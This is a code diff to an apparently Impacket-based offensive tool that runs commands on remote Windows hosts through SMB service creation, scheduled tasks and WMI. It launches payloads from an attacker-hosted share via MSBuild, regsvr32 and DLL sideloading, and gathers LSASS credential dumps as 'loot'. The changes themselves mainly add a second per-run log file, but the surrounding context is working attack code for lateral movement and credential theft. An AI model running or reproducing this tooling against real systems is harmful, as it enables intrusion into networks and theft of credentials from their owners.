@@ -81,6 +81,10 @@ with open('{}/log.txt'.format(cwd), 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
 
+with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+    f.write('{}{}{}'.format('\n', timestamp, '\n'))
+    f.close()
+
 
 ################################################ Start of SMBEXEC ###############################################################
 
@@ -221,6 +225,9 @@ class SMBEXECShell():
         with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('{}: {}\n'.format(addr, 'Executing %s' % command))
             f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+            f.write('{}: {}\n'.format(addr, 'Executing %s' % command))
+            f.close()
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                      lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
@@ -246,6 +253,9 @@ class SMBEXECShell():
             with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, data_out))
                 f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, data_out))
+                f.close()
 
             return data_out
         except UnicodeDecodeError:
@@ -255,6 +265,9 @@ class SMBEXECShell():
             print(self.__outputBuffer.decode(CODEC, errors='replace'))
 
             with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
+                f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
                 f.close()
 
@@ -301,6 +314,9 @@ class TSCH_EXEC:
             with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, e))
                 f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, e))
+                f.close()
             logging.error('{}: {}'.format(addr, e))
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                 logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
@@ -309,6 +325,9 @@ class TSCH_EXEC:
         def output_callback(data):
             try:
                 with open('{}/log.txt'.format(cwd), 'a') as f:
+                    f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
+                    f.close()
+                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                     f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
                     f.close()
                 if logging.getLogger().level == logging.DEBUG:
@@ -402,12 +421,18 @@ class TSCH_EXEC:
             with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
                 f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
+                f.close()
             if logging.getLogger().level == logging.DEBUG:
                 logging.info('{}: Creating task \\{}'.format(addr, tmpName))
             tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
             taskCreated = True
 
             with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: Running task \\{}\n'.format(addr, tmpName))
+                f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                 f.write('{}: Running task \\{}\n'.format(addr, tmpName))
                 f.close()
             if logging.getLogger().level == logging.DEBUG:
@@ -434,6 +459,9 @@ class TSCH_EXEC:
                 else:
                     time.sleep(2)
             with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
+                f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                 f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
                 f.close()
             if logging.getLogger().level == logging.DEBUG:
@@ -463,6 +491,9 @@ class TSCH_EXEC:
                 with open('{}/log.txt'.format(cwd), 'a') as f:
                     f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                     f.close()
+                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                    f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
+                    f.close()
                 if logging.getLogger().level == logging.DEBUG:
                     logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
                 smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
@@ -480,6 +511,9 @@ class TSCH_EXEC:
                 else:
                     raise
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
             f.close()
         if logging.getLogger().level == logging.DEBUG:
@@ -532,6 +566,17 @@ class WMIEXEC:
                     f.write("{}: SMBv3.0 dialect used\n".format(addr))
                 f.close()
 
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                if dialect == SMB_DIALECT:
+                    f.write("{}: SMBv1 dialect used\n".format(addr))
+                elif dialect == SMB2_DIALECT_002:
+                    f.write("{}: SMBv2.0 dialect used\n".format(addr))
+                elif dialect == SMB2_DIALECT_21:
+                    f.write("{}: SMBv2.1 dialect used\n".format(addr))
+                else:
+                    f.write("{}: SMBv3.0 dialect used\n".format(addr))
+                f.close()
+
             if logging.getLogger().level == logging.DEBUG:
                 if dialect == SMB_DIALECT:
                     logging.info("{}: SMBv1 dialect used".format(addr))
@@ -561,6 +606,9 @@ class WMIEXEC:
                 import traceback
                 traceback.print_exc()
             with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, str(e)))
+                f.close()
+            with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, str(e)))
                 f.close()
             logging.error('{}: {}'.format(addr, str(e)))
@@ -690,6 +738,9 @@ class RemoteShell(cmd.Cmd):
             f.write(self.__outputBuffer)
             f.close()
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write(self.__outputBuffer + '\n')
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write(self.__outputBuffer + '\n')
             f.close()
         if logging.getLogger().level == logging.DEBUG:
@@ -1101,11 +1152,16 @@ def alt_exec():
         pass
 
     try:
-        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
+        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
     except BaseException as e:
         pass
-    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU,
-                                                                                                         color_reset))
+
+    try:
+        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+    except BaseException as e:
+        pass
+
+    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
     exit(0)
 
 
@@ -1125,6 +1181,9 @@ def exec_netuse(ip, domain):
 
             traceback.print_exc()
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('{}: {}\n'.format(ip, str(e)))
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write('{}: {}\n'.format(ip, str(e)))
             f.close()
 
@@ -1151,6 +1210,9 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
                     traceback.print_exc()
                 with open('{}/log.txt'.format(cwd), 'a') as f:
+                    f.write('{}: {}\n'.format(addresses[x], str(e)))
+                    f.close()
+                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                     f.write('{}: {}\n'.format(addresses[x], str(e)))
                     f.close()
 
@@ -1188,9 +1250,15 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                             pass
 
                         try:
-                            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
+                            os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
                         except BaseException as e:
                             pass
+
+                        try:
+                            os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+                        except BaseException as e:
+                            pass
+
                         print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
                         exit(0)
                 continue
@@ -1209,6 +1277,9 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                     import traceback
                     traceback.print_exc()
                 with open('{}/log.txt'.format(cwd), 'a') as f:
+                    f.write(str(e) + '\n')
+                    f.close()
+                with open('{}/indivlog.txt'.format(cwd), 'a') as f:
                     f.write(str(e) + '\n')
                     f.close()
                 logging.error(str(e))
@@ -1273,6 +1344,9 @@ def mt_execute(ip):  # multithreading requires a function
 
             traceback.print_exc()
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('{}: {}\n'.format(ip, str(e)))
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write('{}: {}\n'.format(ip, str(e)))
             f.close()
         logging.error('{}: {}'.format(ip, str(e)))
@@ -1490,13 +1564,13 @@ if __name__ == '__main__':
             print("\n[This is where the fun begins]\n{} Executing {} via {}\n".format(green_plus, options.payload, options.method))
 
         if options.payload == 'msbuild':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'regsvr32':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
         elif options.payload == 'exe':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'dllsideload':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
 
         print(command)
         print("")
@@ -1505,6 +1579,9 @@ if __name__ == '__main__':
             alt_exec()
 
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('Total targets: {}\n'.format(len(addresses)))
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write('Total targets: {}\n'.format(len(addresses)))
             f.close()
         print('Total targets: {}'.format(len(addresses)))
@@ -1523,15 +1600,21 @@ if __name__ == '__main__':
                     with open('{}/log.txt'.format(cwd), 'a') as f:
                         f.write(str(e) + '\n')
                         f.close()
+                    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
+                        f.write(str(e) + '\n')
+                        f.close()
                     logging.error(str(e))
                     continue
                 except KeyboardInterrupt as e:
                     continue
 
         time.sleep(2)
-        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
+        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
 
         with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('Total Extracted LSA: {}/{}\n'.format(len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
+            f.close()
+        with open('{}/indivlog.txt'.format(cwd), 'a') as f:
             f.write('Total Extracted LSA: {}/{}\n'.format(len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
             f.close()
         # for when you're attacking a lot of targets to quickly see how many we got
@@ -1583,9 +1666,15 @@ if __name__ == '__main__':
             pass
 
         try:
-            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
+            os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
         except BaseException as e:
             pass
+
+        try:
+            os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+        except BaseException as e:
+            pass
+
         print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
         exit(0)
 
@@ -1617,5 +1706,11 @@ if __name__ == '__main__':
         os.system("sudo groupdel " + share_group)
     except BaseException as e:
         pass
+
+    try:
+        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+    except BaseException as e:
+        pass
+
     print("{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
     sys.exit(0)
